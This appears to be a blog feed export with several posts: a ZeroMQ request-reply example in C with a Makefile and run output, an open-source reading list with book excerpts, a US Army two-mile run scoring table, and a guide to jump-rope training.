<h4 id="Client-Server-Model"><a href="#Client-Server-Model" class="headerlink" title="Client-Server Model"></a>Client-Server Model</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq_utils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"veto_mq_utils.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">//</span></span><br><span class="line"> print_zmq_version();</span><br><span class="line">    <span class="comment">//  Socket to talk to clients</span></span><br><span class="line">    <span class="keyword">void</span> *context = zmq_ctx_new ();</span><br><span class="line">    <span class="keyword">void</span> *responder = zmq_socket (context, ZMQ_REP);</span><br><span class="line">    <span class="keyword">int</span> rc = zmq_bind (responder, <span class="string">"tcp://*:5555"</span>);</span><br><span class="line">    assert (rc == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> buffer [<span class="number">10</span>];</span><br><span class="line">        zmq_recv (responder, buffer, <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">"Received Hello \n"</span>);</span><br><span class="line">        sleep (<span class="number">1</span>);          <span class="comment">//  Do some 'work'</span></span><br><span class="line">        zmq_send (responder, <span class="string">"World"</span>, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//client.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq_utils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span> (<span class="string">"Connecting to hello world server...\n"</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">void</span> \*context = zmq_ctx_new ();</span><br><span class="line">     <span class="keyword">void</span> \*requester = zmq_socket (context, ZMQ_REQ);</span><br><span class="line"></span><br><span class="line">     zmq_connect (requester, <span class="string">"tcp://localhost:5555"</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">int</span> request_nbr;</span><br><span class="line">     <span class="keyword">for</span> (request_nbr = <span class="number">0</span>; request_nbr != <span class="number">10</span>; request_nbr++) &#123;</span><br><span class="line">         <span class="keyword">char</span> buffer [<span class="number">10</span>];</span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">"Sending Hello %d...\n"</span>, request_nbr);</span><br><span class="line">         zmq_send (requester, <span class="string">"Hello"</span>, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">         zmq_recv (requester, buffer, <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">"Received World %d\n"</span>, request_nbr);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     zmq_close (requester);</span><br><span class="line">     zmq_ctx_destroy (context);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Makefile</span><br><span class="line">SHELL   = /bin/sh</span><br><span class="line">prefix  = /usr/<span class="built_in">local</span></span><br><span class="line">exec_prefix=<span class="variable">$&#123;prefix&#125;</span></span><br><span class="line">srcdir  = .</span><br><span class="line">sbindir = <span class="variable">$&#123;exec_prefix&#125;</span>/sbin</span><br><span class="line">libdir  = <span class="variable">$&#123;exec_prefix&#125;</span>/lib</span><br><span class="line">sysconfdir = <span class="variable">$&#123;prefix&#125;</span>/etc</span><br><span class="line">SETUPDIR = /home/nms</span><br><span class="line">TARGETDIR = $(SETUPDIR)/bin</span><br><span class="line">SRCDIR = .</span><br><span class="line">CC      = gcc</span><br><span class="line">CFLAGS  = -O2 -Wall</span><br><span class="line">CPPFLAGS= -g </span><br><span class="line">DEFS    = </span><br><span class="line">LDFLAGS = </span><br><span class="line">LIBS    = -lzmq  -L/usr/<span class="built_in">local</span>/lib</span><br><span class="line">INCLUDES= -I/usr/<span class="built_in">local</span>/include </span><br><span class="line"></span><br><span class="line">CURR_DIR = $(shell <span class="built_in">pwd</span>)</span><br><span class="line"></span><br><span class="line">CC_TMP = lib</span><br><span class="line"></span><br><span class="line">OBJS    =  $(CC_TMP)/veto_mq_server.o  $(CC_TMP)/veto_mq_utils.o</span><br><span class="line">TARGET  =  veto_mq_server</span><br><span class="line"></span><br><span class="line">.c.o:</span><br><span class="line"> $(CC) -I. $(CPPFLAGS) $(DEFS) $(CFLAGS) -c $&lt;</span><br><span class="line"></span><br><span class="line">all: $(TARGET)</span><br><span class="line"></span><br><span class="line">$(TARGET): $(OBJS)</span><br><span class="line"> $(CC) $(CPPFLAGS) $(OBJS) $(LIBS) $(LDFLAGS) -o <span class="variable">$@</span></span><br><span class="line"> -cp $(SRCDIR)/$(TARGET)  $(TARGETDIR)/$(TARGET) </span><br><span class="line"> -chmod ugo+s $(TARGETDIR)/$(TARGET) </span><br><span class="line"> -chmod ugo+s $(SRCDIR)/$(TARGET) </span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line"> -rm <span class="_">-f</span> *.o *~  *.core core $(TARGET) </span><br><span class="line"> -rm <span class="_">-f</span> $(TARGETDIR)/$(TARGET)</span><br><span class="line"></span><br><span class="line">veto_mq_server.o: veto_mq_server.c</span><br><span class="line"> $(CC) -g -c -o $(CC_TMP)/veto_mq_server.o veto_mq_server.c $(CPPFLAGS) $(INCLUDES)</span><br><span class="line"></span><br><span class="line">veto_mq_utils.o: veto_mq_utils.c</span><br><span class="line"> $(CC) -g -c -o $(CC_TMP)/veto_mq_utils.o veto_mq_utils.c $(INCLUDES)</span><br></pre></td></tr></table></figure>
<h4 id="Running"><a href="#Running" class="headerlink" title="Running"></a>Running</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-3.2<span class="comment"># ./veto_mq_server</span></span><br><span class="line"></span><br><span class="line">bash-3.2<span class="comment"># ps -ef | grep mq | grep -v 'grep'</span></span><br><span class="line">    0  3616     1   0 10:00AM ttys000    0:00.01 ./veto_mq_server</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-3.2<span class="comment"># ./veto_mq_client</span></span><br><span class="line">Connecting to hello world server...</span><br><span class="line">Sending Hello 0...</span><br><span class="line">Received World 0</span><br><span class="line">Sending Hello 1...</span><br><span class="line">Received World 1</span><br><span class="line">Sending Hello 2...</span><br><span class="line">Received World 2</span><br><span class="line">Sending Hello 3...</span><br><span class="line">Received World 3</span><br></pre></td></tr></table></figure>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>（推荐）［美］Pieter Hintjens《ZeroMQ:Messaging for Many Applications》</li>
<li><a href="http://www.jianshu.com/p/8ddb7e19ce46" target="_blank" rel="noopener">ZeroMQ社区生态白皮书</a></li>
<li><a href="http://github.com/zqhxuyuan/2017/10/18/Midd-RocketMQ/" target="_blank" rel="noopener">深入解析中间件之RocketMQ</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术漫谈 | Overview of Open Source</title>
    <url>/2016/04/26/OpenSource/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>开源技术架构漫谈</li>
<li>开源社区与知识产权法</li>
<li>开源软件列表</li>
</ul>
<a id="more"></a>
<h2 id="开源社区"><a href="#开源社区" class="headerlink" title="开源社区"></a>开源社区</h2><ul>
<li><a href="https://jimmysong.io/posts/cncf-introduction/" target="_blank" rel="noopener">CNCF - 云原生计算基金会</a></li>
</ul>
<h2 id="知识产权法"><a href="#知识产权法" class="headerlink" title="知识产权法"></a>知识产权法</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/" target="_blank" rel="noopener">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2017/07/09/Law-Of-Intellectual-Property/" target="_blank" rel="noopener">关于开源协议的法律问题</a>（计划）</li>
<li><a href="http://www.jianshu.com/p/236dd6e22bbb" target="_blank" rel="noopener">Commounity Over Code</a></li>
<li><a href="http://www.jianshu.com/p/841862adb059" target="_blank" rel="noopener">Linus Torvalds: The mind behind Linux</a></li>
<li><a href="http://www.jianshu.com/p/8addb7d0024f" target="_blank" rel="noopener">Github 分支</a></li>
<li><a href="http://www.jianshu.com/p/f7511ac5c753" target="_blank" rel="noopener">引入开源软件的六大运营挑战</a></li>
</ul>
<h2 id="开源软件列表"><a href="#开源软件列表" class="headerlink" title="开源软件列表"></a>开源软件列表</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/" target="_blank" rel="noopener">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-GIS/" target="_blank" rel="noopener">数据可视化（四）开源 GIS 技术简史</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/" target="_blank" rel="noopener">数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/" target="_blank" rel="noopener">基于LVS的AAA负载均衡架构实践</a></li>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/" target="_blank" rel="noopener">基于Ganglia实现服务集群性能态势感知</a></li>
</ul>
<h2 id="开源技术架构漫谈"><a href="#开源技术架构漫谈" class="headerlink" title="开源技术架构漫谈"></a>开源技术架构漫谈</h2><ul>
<li><a href="https://riboseyim.github.io/2018/08/01/OpenSource-Hadoop/" target="_blank" rel="noopener">开源架构技术漫谈：Hadoop</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/" target="_blank" rel="noopener">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/" target="_blank" rel="noopener">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/" target="_blank" rel="noopener">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/" target="_blank" rel="noopener">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/" target="_blank" rel="noopener">SDN 技术指南（二）: OpenFlow </a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/" target="_blank" rel="noopener">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/" target="_blank" rel="noopener">计算机远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/" target="_blank" rel="noopener">基于LVS的AAA负载均衡架构实践</a></li>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/" target="_blank" rel="noopener">基于Ganglia实现服务集群性能态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/" target="_blank" rel="noopener">Stack Overflow：云计算平台的趋势分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/" target="_blank" rel="noopener">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/" target="_blank" rel="noopener">Stack Overflow: The Architecture &amp; Hardware - 2016 Edition</a></li>
</ul>
<h2 id="荐书"><a href="#荐书" class="headerlink" title="荐书"></a>荐书</h2><h4 id="《大教堂与集市》"><a href="#《大教堂与集市》" class="headerlink" title="《大教堂与集市》"></a>《大教堂与集市》</h4><ul>
<li>Eric S. Raymond.</li>
<li>大教堂与集市（开源运动的《圣经》） (O’Reilly精品图书系列)</li>
</ul>
<blockquote>
<p>Linux世界的运转，在很多方面像一个自由市场，或者像一个由很多利己个体组成的生态系统。</p>
<p>技术上很好玩的东西，其他“无聊”部分则会被丢在一边（或半途而废），等那些受金钱激励的坐在隔间里的苦工们在管理者的严厉鞭策下机械地将其生产出来。我将从心理学和社会学角度，在“开垦心智层”（Homesteading the Noosphere）一文中对这种观点进行质疑。</p>
<p>在中央集权不存在或较弱的情况下，正如黑客惯例那样，习惯法理论也在有机地演变。在斯堪的纳维亚民族和日耳曼民族，它发展了一千多年。英国近代政治哲学家John Locke将其进一步系统化和理性化，所以该理论有时也称Locken财产权理论。</p>
<p>开源世界的1.0版意味“开发者愿意拿自己的名誉赌它好使”，而闭源世界的1.0版则意味着“如果你很谨慎，不要用这版”</p>
<p>一些文化使用隐藏的线索(更精确地说是一些具有宗教或神秘意味的“奥秘”)作为文化移入机制。它们是一些不对外公开的秘密，但要求那些充满渴望的新手们能发现和推理出来。一个人如果想被该文化接受，必须要展示他能理解这些秘密，而且以一种被文化认可的方式掌握了这些秘密。 黑客文化非常有意识地大量使用这样的线索或测试。</p>
<p><strong>从习惯到习惯法：</strong> 我们已经发现黑客习俗和英裔美国人普通法传统下的土地所有制理论在逻辑上非常类同。从历史上讲12，欧洲部落文化发明了这些传统，并改善了他们的冲突解决体系——从表达不清的、半意识的习惯体系发展到掌握在部落智者记忆中明确的习惯法，并最终发展成为成书面制度。</p>
<p>也许，当我们人数不断增加、当所有新成员的文化移入变得困难时，黑客文化也该做一些类似的事—— <strong>将一些优秀实践发展成为规范，解决开源项目中可能出现的各种争议，并发展出一种可以让社区中资深成员调解纠纷的仲裁传统。</strong> 本文的分析将以前隐性的东西显性化，并大致勾勒了这种规范的轮廓。规范不能强加于人，它必须被各个项目的创建者或所有者自愿接受；由于作用在黑客文化上的压力会随时间变化，规范也不能全然僵化；最后，为了让这些规范实施起来，它必须能反映黑客部落的普遍共识。</p>
<p>程序的使用价值是它作为一个工具、一个生产率倍乘器的经济价值；程序的销售价值是它作为一个可买卖商品的价值。（按照经济学家的专业说法，销售价值是最终产品价值，使用价值是中间产品价值。）</p>
<p>换句话说，<strong>软件很大程度上是一个服务行业</strong></p>
<p>开源公司聘请明星黑客和大学聘请明星教授的原因大致相同，他们的做法在机制和效果上类似于工业革命前贵族对高雅艺术的资助——部分当事人完全了解这种相似性</p>
<p>一帮人在一起，不会有什么突破性的创见——即便是集市中那些无政府主义者组成的志愿者团体，通常也不能有真正的创见，更不要说公司委员会中那些为生计着想的还活在过去年代的人了。远见源自个人，其周遭社会机器的最好做法，就是响应这些有突破性的远见——滋养、奖赏并严格测试它们，而不是压制它们。</p>
</blockquote>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/articles/how-node-js-create-an-open-source-community-model?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global" target="_blank" rel="noopener">Node.js 是如何创建开源社区模式的 | InfoQ</a></li>
<li><a href="http://www.infoq.com/cn/articles/twitter-open-source-list?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global" target="_blank" rel="noopener">Twitter开源软件列表 | InfoQ</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2017/08/issue.html" target="_blank" rel="noopener"> 如何使用 Issue 管理软件项目？| 阮一峰</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>战斗体能训练：跑步</title>
    <url>/2016/04/26/PHT-Running/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><h4 id="美国陆军体能要求"><a href="#美国陆军体能要求" class="headerlink" title="美国陆军体能要求"></a>美国陆军体能要求</h4><ul>
<li>U.S. Army Physical Fitness Requirements : Running (2 Miles)</li>
</ul>
<div class="mntl-sc-block-table__table-wrapper">
<table class="mntl-sc-block-table__table">
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<colgroup style="" span="1"></colgroup>
<tbody data-check="-1">
<tr>
<td><strong>Time</strong></td>
<td><strong>Score</strong></td>
<td><strong>Time</strong></td>
<td><strong>Score</strong></td>
<td><strong>Time</strong></td>
<td><strong>Score</strong></td>
<td><strong>Time</strong></td>
<td><strong>Score</strong></td>
</tr>
<tr>
<td>12:54</td>
<td></td>
<td>16:24</td>
<td>66</td>
<td>19:54</td>
<td>29</td>
<td>23:24</td>
<td></td>
</tr>
<tr>
<td>13:00</td>
<td></td>
<td>16:30</td>
<td>65</td>
<td>20:00</td>
<td>28</td>
<td>23:30</td>
<td></td>
</tr>
<tr>
<td>13:06</td>
<td></td>
<td>16:36</td>
<td>64</td>
<td>20:06</td>
<td>26</td>
<td>23:36</td>
<td></td>
</tr>
<tr>
<td>13:12</td>
<td></td>
<td>16:42</td>
<td>63</td>
<td>20:12</td>
<td>25</td>
<td>23:42</td>
<td></td>
</tr>
<tr>
<td>13:18</td>
<td><strong>100</strong></td>
<td>16:48</td>
<td>62</td>
<td>20:18</td>
<td>24</td>
<td>23:48</td>
<td></td>
</tr>
<tr>
<td>13:24</td>
<td>99</td>
<td>16:54</td>
<td>61</td>
<td>20:24</td>
<td>23</td>
<td>23:54</td>
<td></td>
</tr>
<tr>
<td>13:30</td>
<td>98</td>
<td>17:00</td>
<td><strong>60</strong></td>
<td>20:30</td>
<td>22</td>
<td>24:00</td>
<td></td>
</tr>
<tr>
<td>13:36</td>
<td>97</td>
<td>17:06</td>
<td><strong>59</strong></td>
<td>20:36</td>
<td>21</td>
<td>24:06</td>
<td></td>
</tr>
<tr>
<td>13:42</td>
<td>96</td>
<td>17:12</td>
<td>58</td>
<td>20:42</td>
<td>20</td>
<td>24:12</td>
<td></td>
</tr>
<tr>
<td>13:48</td>
<td>95</td>
<td>17:18</td>
<td>57</td>
<td>20:48</td>
<td>19</td>
<td>24:18</td>
<td></td>
</tr>
<tr>
<td>13:54</td>
<td>94</td>
<td>17:24</td>
<td>56</td>
<td>20:54</td>
<td>18</td>
<td>24:24</td>
<td></td>
</tr>
<tr>
<td>14:00</td>
<td>92</td>
<td>17:30</td>
<td>55</td>
<td>21:00</td>
<td>17</td>
<td>24:30</td>
<td></td>
</tr>
<tr>
<td>14:06</td>
<td>91</td>
<td>17:36</td>
<td>54</td>
<td>21:06</td>
<td>16</td>
<td>24:36</td>
<td></td>
</tr>
<tr>
<td>14:12</td>
<td>90</td>
<td>17:42</td>
<td>52</td>
<td>21:12</td>
<td>15</td>
<td>24:42</td>
<td></td>
</tr>
<tr>
<td>14:18</td>
<td>89</td>
<td>17:48</td>
<td>51</td>
<td>21:18</td>
<td>14</td>
<td>24:48</td>
<td></td>
</tr>
<tr>
<td>14:24</td>
<td>88</td>
<td>17:54</td>
<td>50</td>
<td>21:24</td>
<td>12</td>
<td>24:54</td>
<td></td>
</tr>
<tr>
<td>14:30</td>
<td>87</td>
<td>18:00</td>
<td>49</td>
<td>21:30</td>
<td>11</td>
<td>25:00</td>
<td></td>
</tr>
<tr>
<td>14:36</td>
<td>86</td>
<td>18:06</td>
<td>48</td>
<td>21:36</td>
<td>10</td>
<td>25:06</td>
<td></td>
</tr>
<tr>
<td>14:42</td>
<td>85</td>
<td>18:12</td>
<td>47</td>
<td>21:42</td>
<td>9</td>
<td>25:12</td>
<td></td>
</tr>
<tr>
<td>14:48</td>
<td>84</td>
<td>18:18</td>
<td>46</td>
<td>21:48</td>
<td>8</td>
<td>25:18</td>
<td></td>
</tr>
<tr>
<td>14:54</td>
<td>83</td>
<td>18:24</td>
<td>45</td>
<td>21:54</td>
<td>7</td>
<td>25:24</td>
<td></td>
</tr>
<tr>
<td>15:00</td>
<td>82</td>
<td>18:30</td>
<td>44</td>
<td>22:00</td>
<td>6</td>
<td>25:30</td>
<td></td>
</tr>
<tr>
<td>15:06</td>
<td>81</td>
<td>18:36</td>
<td>43</td>
<td>22:06</td>
<td>5</td>
<td>25:36</td>
<td></td>
</tr>
<tr>
<td>15:12</td>
<td>79</td>
<td>18:42</td>
<td>42</td>
<td>22:12</td>
<td>4</td>
<td>25:42</td>
<td></td>
</tr>
<tr>
<td>15:18</td>
<td>78</td>
<td>18:48</td>
<td>41</td>
<td>22:18</td>
<td>3</td>
<td>25:48</td>
<td></td>
</tr>
<tr>
<td>15:24</td>
<td>77</td>
<td>18:54</td>
<td>39</td>
<td>22:24</td>
<td>2</td>
<td>25:54</td>
<td></td>
</tr>
<tr>
<td>15:30</td>
<td>76</td>
<td>19:00</td>
<td>38</td>
<td>22:30</td>
<td>1</td>
<td>26:00</td>
<td></td>
</tr>
<tr>
<td>15:36</td>
<td>75</td>
<td>19:06</td>
<td>37</td>
<td>22:36</td>
<td>0</td>
<td>26:06</td>
<td></td>
</tr>
<tr>
<td>15:42</td>
<td>74</td>
<td>19:12</td>
<td>36</td>
<td>22:42</td>
<td></td>
<td>26:12</td>
<td></td>
</tr>
<tr>
<td>15:48</td>
<td>73</td>
<td>19:18</td>
<td>35</td>
<td>22:48</td>
<td></td>
<td>26:18</td>
<td></td>
</tr>
<tr>
<td>15:54</td>
<td>72</td>
<td>19:24</td>
<td>34</td>
<td>22:54</td>
<td></td>
<td>26:24</td>
<td></td>
</tr>
<tr>
<td>16:00</td>
<td>71</td>
<td>19:30</td>
<td>33</td>
<td>23:00</td>
<td></td>
<td>26:30</td>
<td></td>
</tr>
<tr>
<td>16:06</td>
<td>70</td>
<td>19:36</td>
<td>32</td>
<td>23:06</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>16:12</td>
<td>69</td>
<td>19:42</td>
<td>31</td>
<td>23:12</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>16:18</td>
<td>68</td>
<td>19:48</td>
<td>30</td>
<td>23:18</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>

<h2 id="工具与技术"><a href="#工具与技术" class="headerlink" title="工具与技术"></a>工具与技术</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/theme_running_nike+.png" alt=""></p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>讲武堂</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title>战斗体能训练:跳绳</title>
    <url>/2019/05/19/PHT-Skipping/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>人的终极关怀应该是寻找到一种自我与周遭环境的融洽方式。—— RiboseYim</p>
</blockquote>
<ul>
<li>跳绳是一种古老的娱乐活动</li>
<li>跳绳是一项很有效的有氧运动</li>
<li>跳绳是拳击运动员的常规训练科目</li>
<li>新时代生存难度系数：中考竞赛科目</li>
</ul>
<span id="more"></span>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>跳绳是一种古老的娱乐活动。唐朝称“透索”，宋称“跳索”，明称“跳百索”、“跳白索”、“跳马索”，清称“绳飞”，清末以后跳绳称作“跳绳”。跳绳是一项极佳的运动项目，能有效训练个人的反应和耐力。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Theme.png" alt=""></p>
<p>跳绳是一项很有效的有氧运动，从运动量来说，持续跳绳10分钟，与慢跑30分钟相差无几，可谓是一项耗时少、耗能大的有氧运动。跳绳能增强人体心血管、呼吸和神经系统的功能。</p>
<p>跳绳可以结实全身肌肉，消除臀部和大腿上的多余脂肪并能使动作敏捷、稳定身体的重心。跳绳训练人的弹跳、速度、平衡、耐力和爆发力，同时可培养准确性、灵活性、协调性。</p>
<p><strong>注意事项：</strong></p>
<ul>
<li>跳绳前热身10分钟。</li>
<li>运动时选择场地或穿减震鞋。</li>
<li>运动后注意拉伸降温和放松。</li>
<li>禁忌：心脏、高血压等疾病或严重疾病康复。</li>
</ul>
<p><strong>基本技巧：</strong></p>
<p>俗语说：“摇绳练臂力，跳绳练腿劲；快摇练速度”。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Them-Bihua.jpg" alt=""></p>
<ul>
<li>基础跳绳：双脚稍微分开并同时跳跃避开绳子的方式。</li>
<li>交互跳绳：双脚交互跳跃避开绳子的跳绳方式。这种技巧在每分钟跳绳的次数是上面基础技巧的两倍。</li>
<li>纵横交错：这种方式与基础跳绳相似，唯一不同的是在跳跃时左手置于身体的右边而右手则置于身体的左边。</li>
<li>双摇跳：在跳双摇跳时，跳绳者需比一般的跳绳方式的跳跃高度跳得稍高一点点，让绳子两次在脚下经过，一些跳绳高手更可让绳子在脚下经过三次。事实上在跳绳比赛中，三次、四次和甚至五次并不罕见。在美国的跳绳比赛中，年龄大于15岁的男性须有能力做200次以上的三摇跳。</li>
</ul>
<p><strong>花式跳绳：</strong></p>
<ul>
<li>联合跳跃：这是由两种或以上不同的跳绳技巧联合为一个花式的跳绳花式。</li>
<li>交叉握腿跳：腿下X是一个复杂的花式，跳绳者需将左手置于右脚下，右手置于左脚下。</li>
<li>“滑雪跳”：把双腿保持紧紧贴在一起，然后不断左右跳动。</li>
<li>“并脚前后跳”：把双腿保持紧紧贴在一起，然后不断前后跳动。</li>
<li>“剪刀脚跳”：把双脚不断前后交替地跳动。</li>
<li>“分腿弹跳”：不断把双脚分开合上跳动。</li>
<li>“肯肯跳”：把膝盖提高，作单脚跳。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/rope2_10.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/rope2_18.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Theme-Team.png" alt=""></p>
